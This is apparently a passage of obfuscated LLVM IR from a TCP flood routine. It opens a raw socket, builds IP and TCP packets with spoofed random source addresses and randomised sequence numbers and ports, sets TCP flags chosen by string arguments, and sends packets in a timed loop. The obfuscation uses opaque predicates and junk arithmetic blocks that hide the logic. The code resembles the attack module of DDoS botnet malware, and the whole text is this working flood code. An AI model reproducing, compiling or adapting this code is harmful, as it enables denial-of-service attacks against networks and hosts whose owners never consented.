  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %294, -513
  %296 = or i16 %295, 512
  store i16 %296, i16* %293, align 4
  br label %398

; <label>:297:                                    ; preds = %285
  %298 = load i32, i32* @x.41
  %299 = load i32, i32* @y.42
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %297
  %306 = load i8*, i8** %31, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %308 = icmp ne i32 %307, 0
  %309 = load i32, i32* @x.41
  %310 = load i32, i32* @y.42
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br i1 %308, label %325, label %317

; <label>:317:                                    ; preds = %originalBBpart2181
  %318 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.1* %319 to %struct.anon.2*
  %321 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -1025
  %324 = or i16 %323, 1024
  store i16 %324, i16* %321, align 4
  br label %397

; <label>:325:                                    ; preds = %originalBBpart2181
  %326 = load i32, i32* @x.41
  %327 = load i32, i32* @y.42
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %325
  %334 = load i8*, i8** %31, align 8
  %335 = call i32 @strcmp(i8* %334, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %336 = icmp ne i32 %335, 0
  %337 = load i32, i32* @x.41
  %338 = load i32, i32* @y.42
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br i1 %336, label %353, label %345

; <label>:345:                                    ; preds = %originalBBpart2185
  %346 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon.1* %347 to %struct.anon.2*
  %349 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = and i16 %350, -257
  %352 = or i16 %351, 256
  store i16 %352, i16* %349, align 4
  br label %396

; <label>:353:                                    ; preds = %originalBBpart2185
  %354 = load i8*, i8** %31, align 8
  %355 = call i32 @strcmp(i8* %354, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0)) #10
  %356 = icmp ne i32 %355, 0
  br i1 %356, label %381, label %357

; <label>:357:                                    ; preds = %353
  %358 = load i32, i32* @x.41
  %359 = load i32, i32* @y.42
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %357
  %366 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon.1* %367 to %struct.anon.2*
  %369 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = and i16 %370, -4097
  %372 = or i16 %371, 4096
  store i16 %372, i16* %369, align 4
  %373 = load i32, i32* @x.41
  %374 = load i32, i32* @y.42
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart2215, label %originalBB187alteredBB

originalBBpart2215:                               ; preds = %originalBB187
  br label %395

; <label>:381:                                    ; preds = %353
  %382 = load i8*, i8** %31, align 8
  %383 = call i32 @strcmp(i8* %382, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %384 = icmp ne i32 %383, 0
  br i1 %384, label %393, label %385

; <label>:385:                                    ; preds = %381
  %386 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.1* %387 to %struct.anon.2*
  %389 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %388, i32 0, i32 4
  %390 = load i16, i16* %389, align 4
  %391 = and i16 %390, -2049
  %392 = or i16 %391, 2048
  store i16 %392, i16* %389, align 4
  br label %394

; <label>:393:                                    ; preds = %381
  br label %394

; <label>:394:                                    ; preds = %393, %385
  br label %395

; <label>:395:                                    ; preds = %394, %originalBBpart2215
  br label %396

; <label>:396:                                    ; preds = %395, %345
  br label %397

; <label>:397:                                    ; preds = %396, %317
  br label %398

; <label>:398:                                    ; preds = %397, %289
  %399 = load i32, i32* @x.41
  %400 = load i32, i32* @y.42
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB217, label %originalBB217alteredBB

originalBB217:                                    ; preds = %originalBB217alteredBB, %398
  %407 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %407, i8** %31, align 8
  %408 = load i32, i32* @x.41
  %409 = load i32, i32* @y.42
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart2219, label %originalBB217alteredBB

originalBBpart2219:                               ; preds = %originalBB217
  br label %282

; <label>:416:                                    ; preds = %282
  br label %417

; <label>:417:                                    ; preds = %416, %originalBBpart2177
  %418 = call i32 @rand_cmwc()
  %419 = trunc i32 %418 to i16
  %420 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %421 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %420, i32 0, i32 0
  %422 = bitcast %union.anon.1* %421 to %struct.anon.2*
  %423 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %422, i32 0, i32 5
  store i16 %419, i16* %423, align 2
  %424 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = bitcast %union.anon.1* %425 to %struct.anon.2*
  %427 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %426, i32 0, i32 6
  store i16 0, i16* %427, align 4
  %428 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 0
  %430 = bitcast %union.anon.1* %429 to %struct.anon.2*
  %431 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %430, i32 0, i32 7
  store i16 0, i16* %431, align 2
  %432 = load i32, i32* %17, align 4
  %433 = icmp eq i32 %432, 0
  br i1 %433, label %434, label %452

; <label>:434:                                    ; preds = %417
  %435 = load i32, i32* @x.41
  %436 = load i32, i32* @y.42
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB221, label %originalBB221alteredBB

originalBB221:                                    ; preds = %originalBB221alteredBB, %434
  %443 = call i32 @rand_cmwc()
  %444 = load i32, i32* @x.41
  %445 = load i32, i32* @y.42
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBBpart2223, label %originalBB221alteredBB

originalBBpart2223:                               ; preds = %originalBB221
  br label %457

; <label>:452:                                    ; preds = %417
  %453 = load i32, i32* %17, align 4
  %454 = trunc i32 %453 to i16
  %455 = call zeroext i16 @htons(i16 zeroext %454) #9
  %456 = zext i16 %455 to i32
  br label %457

; <label>:457:                                    ; preds = %452, %originalBBpart2223
  %458 = phi i32 [ %443, %originalBBpart2223 ], [ %456, %452 ]
  %459 = trunc i32 %458 to i16
  %460 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %461 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %460, i32 0, i32 0
  %462 = bitcast %union.anon.1* %461 to %struct.anon.2*
  %463 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %462, i32 0, i32 1
  store i16 %459, i16* %463, align 2
  %464 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %465 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %466 = call zeroext i16 @tcpcsum(%struct.iphdr* %464, %struct.tcphdr* %465)
  %467 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  %469 = bitcast %union.anon.1* %468 to %struct.anon.2*
  %470 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %469, i32 0, i32 6
  store i16 %466, i16* %470, align 4
  %471 = bitcast i8* %177 to i16*
  %472 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 2
  %474 = load i16, i16* %473, align 2
  %475 = zext i16 %474 to i32
  %476 = call zeroext i16 @csum(i16* %471, i32 %475)
  %477 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 7
  store i16 %476, i16* %478, align 2
  %479 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %480 = load i32, i32* %18, align 4
  %481 = add nsw i32 %479, %480
  store i32 %481, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %482

; <label>:482:                                    ; preds = %originalBBpart2238, %550, %457
  %483 = load i32, i32* @x.41
  %484 = load i32, i32* @y.42
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBB225, label %originalBB225alteredBB

originalBB225:                                    ; preds = %originalBB225alteredBB, %482
  %491 = load i32, i32* @x.41
  %492 = load i32, i32* @y.42
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart2227, label %originalBB225alteredBB

originalBBpart2227:                               ; preds = %originalBB225
  br label %499

; <label>:499:                                    ; preds = %originalBBpart2227
  %500 = load i32, i32* %25, align 4
  %501 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %502 = call i64 @sendto(i32 %500, i8* %177, i64 %175, i32 0, %struct.sockaddr* %501, i32 16)
  %503 = load i32, i32* %27, align 4
  %504 = call i32 @getRandomIP(i32 %503)
  %505 = call i32 @htonl(i32 %504) #9
  %506 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 8
  store i32 %505, i32* %507, align 4
  %508 = call i32 @rand_cmwc()
  %509 = trunc i32 %508 to i16
  %510 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 3
  store i16 %509, i16* %511, align 4
  %512 = call i32 @rand_cmwc()
  %513 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 0
  %515 = bitcast %union.anon.1* %514 to %struct.anon.2*
  %516 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %515, i32 0, i32 2
  store i32 %512, i32* %516, align 4
  %517 = call i32 @rand_cmwc()
  %518 = trunc i32 %517 to i16
  %519 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %520 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %519, i32 0, i32 0
  %521 = bitcast %union.anon.1* %520 to %struct.anon.2*
  %522 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %521, i32 0, i32 0
  store i16 %518, i16* %522, align 4
  %523 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 0
  %525 = bitcast %union.anon.1* %524 to %struct.anon.2*
  %526 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %525, i32 0, i32 6
  store i16 0, i16* %526, align 4
  %527 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %528 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %529 = call zeroext i16 @tcpcsum(%struct.iphdr* %527, %struct.tcphdr* %528)
  %530 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 0
  %532 = bitcast %union.anon.1* %531 to %struct.anon.2*
  %533 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %532, i32 0, i32 6
  store i16 %529, i16* %533, align 4
  %534 = bitcast i8* %177 to i16*
  %535 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 2
  %537 = load i16, i16* %536, align 2
  %538 = zext i16 %537 to i32
  %539 = call zeroext i16 @csum(i16* %534, i32 %538)
  %540 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 7
  store i16 %539, i16* %541, align 2
  %542 = load i32, i32* %33, align 4
  %543 = load i32, i32* %23, align 4
  %544 = icmp eq i32 %542, %543
  br i1 %544, label %545, label %551

; <label>:545:                                    ; preds = %499
  %546 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %547 = load i32, i32* %32, align 4
  %548 = icmp sgt i32 %546, %547
  br i1 %548, label %549, label %550

; <label>:549:                                    ; preds = %545
  br label %570

; <label>:550:                                    ; preds = %545
  store i32 0, i32* %33, align 4
  br label %482

; <label>:551:                                    ; preds = %499
  %552 = load i32, i32* @x.41
  %553 = load i32, i32* @y.42
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %551
  %560 = load i32, i32* %33, align 4
  %561 = add i32 %560, 1
  store i32 %561, i32* %33, align 4
  %562 = load i32, i32* @x.41
  %563 = load i32, i32* @y.42
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBBpart2238, label %originalBB229alteredBB

originalBBpart2238:                               ; preds = %originalBB229
  br label %482

; <label>:570:                                    ; preds = %549
  %571 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %571)
  br label %572

; <label>:572:                                    ; preds = %570, %121, %originalBBpart212, %76
  %573 = load i32, i32* @x.41
  %574 = load i32, i32* @y.42
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBB240, label %originalBB240alteredBB

originalBB240:                                    ; preds = %originalBB240alteredBB, %572
  %581 = load i32, i32* @x.41
  %582 = load i32, i32* @y.42
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBBpart2242, label %originalBB240alteredBB

originalBBpart2242:                               ; preds = %originalBB240
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %589 = alloca i8*, align 8
  %590 = alloca i32, align 4
  %591 = alloca i32, align 4
  %592 = alloca i32, align 4
  %593 = alloca i8*, align 8
  %594 = alloca i32, align 4
  %595 = alloca i32, align 4
  %596 = alloca i32, align 4
  %597 = alloca %struct.sockaddr_in, align 4
  %598 = alloca i32, align 4
  %599 = alloca i32, align 4
  %600 = alloca i32, align 4
  %601 = alloca i8*, align 8
  %602 = alloca %struct.iphdr*, align 8
  %603 = alloca %struct.tcphdr*, align 8
  %604 = alloca i8*, align 8
  %605 = alloca i32, align 4
  %606 = alloca i32, align 4
  store i8* %0, i8** %589, align 8
  store i32 %1, i32* %590, align 4
  store i32 %2, i32* %591, align 4
  store i32 %3, i32* %592, align 4
  store i8* %4, i8** %593, align 8
  store i32 %5, i32* %594, align 4
  store i32 %6, i32* %595, align 4
  %607 = load i32, i32* %595, align 4
  store i32 %607, i32* %596, align 4
  %608 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %597, i32 0, i32 0
  store i16 2, i16* %608, align 4
  %609 = load i32, i32* %590, align 4
  %610 = icmp eq i32 %609, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %611 = load i8*, i8** %16, align 8
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %613 = call i32 @getHost(i8* %611, %struct.in_addr* %612)
  %614 = icmp ne i32 %613, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %615 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 3
  %616 = getelementptr inbounds [8 x i8], [8 x i8]* %615, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %616, i8 0, i64 8, i32 4, i1 false)
  %617 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %617, i32* %25, align 4
  %618 = load i32, i32* %25, align 4
  %619 = icmp ne i32 %618, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %99
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %122
  %620 = load i32, i32* %19, align 4
  %621 = icmp eq i32 %620, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  %622 = load i32, i32* %19, align 4
  %_ = sub i32 32, %622
  %gen = mul i32 %_, %622
  %_19 = sub i32 32, %622
  %gen20 = mul i32 %_19, %622
  %_21 = shl i32 32, %622
  %_22 = sub i32 0, 32
  %gen23 = add i32 %_22, %622
  %_24 = shl i32 32, %622
  %_25 = sub i32 0, 32
  %gen26 = add i32 %_25, %622
  %_27 = sub i32 32, %622
  %gen28 = mul i32 %_27, %622
  %_29 = shl i32 32, %622
  %_30 = sub i32 0, 32
  %gen31 = add i32 %_30, %622
  %623 = sub nsw i32 32, %622
  %_32 = shl i32 1, %623
  %_33 = sub i32 0, 1
  %gen34 = add i32 %_33, %623
  %_35 = shl i32 1, %623
  %_36 = sub i32 0, 1
  %gen37 = add i32 %_36, %623
  %_38 = shl i32 1, %623
  %624 = shl i32 1, %623
  %_39 = sub i32 0, %624
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 %624, 1
  %gen42 = mul i32 %_41, 1
  %_43 = sub i32 0, %624
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %624, 1
  %gen46 = mul i32 %_45, 1
  %_47 = shl i32 %624, 1
  %625 = sub nsw i32 %624, 1
  %_48 = sub i32 %625, -1
  %gen49 = mul i32 %_48, -1
  %_50 = shl i32 %625, -1
  %_51 = sub i32 %625, -1
  %gen52 = mul i32 %_51, -1
  %_53 = sub i32 %625, -1
  %gen54 = mul i32 %_53, -1
  %_55 = sub i32 %625, -1
  %gen56 = mul i32 %_55, -1
  %_57 = shl i32 %625, -1
  %_58 = shl i32 %625, -1
  %_59 = sub i32 %625, -1
  %gen60 = mul i32 %_59, -1
  %626 = xor i32 %625, -1
  store i32 %626, i32* %27, align 4
  br label %originalBB18

originalBB64alteredBB:                            ; preds = %originalBB64, %164
  %627 = load i32, i32* %21, align 4
  %628 = sext i32 %627 to i64
  %_65 = sub i64 0, 40
  %gen66 = add i64 %_65, %628
  %_67 = sub i64 0, 40
  %gen68 = add i64 %_67, %628
  %_69 = sub i64 0, 40
  %gen70 = add i64 %_69, %628
  %_71 = sub i64 0, 40
  %gen72 = add i64 %_71, %628
  %_73 = sub i64 0, 40
  %gen74 = add i64 %_73, %628
  %_75 = shl i64 40, %628
  %629 = add i64 40, %628
  %630 = call i8* @llvm.stacksave()
  store i8* %630, i8** %28, align 8
  %631 = alloca i8, i64 %629, align 16
  %632 = bitcast i8* %631 to %struct.iphdr*
  store %struct.iphdr* %632, %struct.iphdr** %29, align 8
  %633 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %634 = bitcast %struct.iphdr* %633 to i8*
  %635 = getelementptr i8, i8* %634, i64 20
  %636 = bitcast i8* %635 to %struct.tcphdr*
  store %struct.tcphdr* %636, %struct.tcphdr** %30, align 8
  %637 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %638 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %639 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %638, i32 0, i32 0
  %640 = load i32, i32* %639, align 4
  %641 = load i32, i32* %27, align 4
  %642 = call i32 @getRandomIP(i32 %641)
  %643 = call i32 @htonl(i32 %642) #9
  %644 = load i32, i32* %21, align 4
  %645 = sext i32 %644 to i64
  %_76 = sub i64 20, %645
  %gen77 = mul i64 %_76, %645
  %_78 = shl i64 20, %645
  %_79 = sub i64 20, %645
  %gen80 = mul i64 %_79, %645
  %_81 = sub i64 0, 20
  %gen82 = add i64 %_81, %645
  %_83 = shl i64 20, %645
  %646 = add i64 20, %645
  %647 = trunc i64 %646 to i32
  call void @makeIPPacket(%struct.iphdr* %637, i32 %640, i32 %643, i8 zeroext 6, i32 %647)
  %648 = call i32 @rand_cmwc()
  %649 = trunc i32 %648 to i16
  %650 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %651 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %650, i32 0, i32 0
  %652 = bitcast %union.anon.1* %651 to %struct.anon.2*
  %653 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %652, i32 0, i32 0
  store i16 %649, i16* %653, align 4
  %654 = call i32 @rand_cmwc()
  %655 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %656 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %655, i32 0, i32 0
  %657 = bitcast %union.anon.1* %656 to %struct.anon.2*
  %658 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %657, i32 0, i32 2
  store i32 %654, i32* %658, align 4
  %659 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %660 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %659, i32 0, i32 0
  %661 = bitcast %union.anon.1* %660 to %struct.anon.2*
  %662 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %661, i32 0, i32 3
  store i32 0, i32* %662, align 4
  %663 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %664 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %663, i32 0, i32 0
  %665 = bitcast %union.anon.1* %664 to %struct.anon.2*
  %666 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %665, i32 0, i32 4
  %667 = load i16, i16* %666, align 4
  %_84 = sub i16 %667, -241
  %gen85 = mul i16 %_84, -241
  %_86 = sub i16 %667, -241
  %gen87 = mul i16 %_86, -241
  %_88 = sub i16 0, %667
  %gen89 = add i16 %_88, -241
  %668 = and i16 %667, -241
  %_90 = shl i16 %668, 80
  %_91 = sub i16 0, %668
  %gen92 = add i16 %_91, 80
  %_93 = sub i16 0, %668
  %gen94 = add i16 %_93, 80
  %_95 = sub i16 0, %668
  %gen96 = add i16 %_95, 80
  %_97 = sub i16 0, %668
  %gen98 = add i16 %_97, 80
  %_99 = sub i16 %668, 80
  %gen100 = mul i16 %_99, 80
  %_101 = sub i16 %668, 80
  %gen102 = mul i16 %_101, 80
  %669 = or i16 %668, 80
  store i16 %669, i16* %666, align 4
  %670 = load i8*, i8** %20, align 8
  %671 = call i32 @strcmp(i8* %670, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %672 = icmp ne i32 %671, 0
  br label %originalBB64

originalBB106alteredBB:                           ; preds = %originalBB106, %227
  %673 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %674 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %673, i32 0, i32 0
  %675 = bitcast %union.anon.1* %674 to %struct.anon.2*
  %676 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %675, i32 0, i32 4
  %677 = load i16, i16* %676, align 4
  %_107 = sub i16 %677, -513
  %gen108 = mul i16 %_107, -513
  %_109 = sub i16 0, %677
  %gen110 = add i16 %_109, -513
  %_111 = sub i16 0, %677
  %gen112 = add i16 %_111, -513
  %_113 = shl i16 %677, -513
  %_114 = sub i16 %677, -513
  %gen115 = mul i16 %_114, -513
  %_116 = sub i16 0, %677
  %gen117 = add i16 %_116, -513
  %_118 = sub i16 %677, -513
  %gen119 = mul i16 %_118, -513
  %678 = and i16 %677, -513
  %_120 = sub i16 %678, 512
  %gen121 = mul i16 %_120, 512
  %_122 = sub i16 0, %678
  %gen123 = add i16 %_122, 512
  %_124 = shl i16 %678, 512
  %_125 = sub i16 0, %678
  %gen126 = add i16 %_125, 512
  %_127 = shl i16 %678, 512
  %_128 = sub i16 0, %678
  %gen129 = add i16 %_128, 512
  %_130 = sub i16 0, %678
  %gen131 = add i16 %_130, 512
  %679 = or i16 %678, 512
  store i16 %679, i16* %676, align 4
  %680 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %681 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %680, i32 0, i32 0
  %682 = bitcast %union.anon.1* %681 to %struct.anon.2*
  %683 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %682, i32 0, i32 4
  %684 = load i16, i16* %683, align 4
  %_132 = shl i16 %684, -1025
  %_133 = shl i16 %684, -1025
  %_134 = sub i16 0, %684
  %gen135 = add i16 %_134, -1025
  %_136 = sub i16 %684, -1025
  %gen137 = mul i16 %_136, -1025
  %685 = and i16 %684, -1025
  %_138 = shl i16 %685, 1024
  %_139 = sub i16 0, %685
  %gen140 = add i16 %_139, 1024
  %686 = or i16 %685, 1024
  store i16 %686, i16* %683, align 4
  %687 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %688 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %687, i32 0, i32 0
  %689 = bitcast %union.anon.1* %688 to %struct.anon.2*
  %690 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %689, i32 0, i32 4
  %691 = load i16, i16* %690, align 4
  %_141 = shl i16 %691, -257
  %_142 = shl i16 %691, -257
  %_143 = sub i16 %691, -257
  %gen144 = mul i16 %_143, -257
  %_145 = sub i16 %691, -257
  %gen146 = mul i16 %_145, -257
  %_147 = sub i16 %691, -257
  %gen148 = mul i16 %_147, -257
  %_149 = shl i16 %691, -257
  %_150 = shl i16 %691, -257
  %_151 = shl i16 %691, -257
  %692 = and i16 %691, -257
  %_152 = shl i16 %692, 256
  %_153 = shl i16 %692, 256
  %_154 = sub i16 0, %692
  %gen155 = add i16 %_154, 256
  %_156 = sub i16 %692, 256
  %gen157 = mul i16 %_156, 256
  %_158 = shl i16 %692, 256
  %_159 = shl i16 %692, 256
  %_160 = shl i16 %692, 256
  %693 = or i16 %692, 256
  store i16 %693, i16* %690, align 4
  %694 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %695 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %694, i32 0, i32 0
  %696 = bitcast %union.anon.1* %695 to %struct.anon.2*
  %697 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %696, i32 0, i32 4
  %698 = load i16, i16* %697, align 4
  %_161 = sub i16 %698, -4097
  %gen162 = mul i16 %_161, -4097
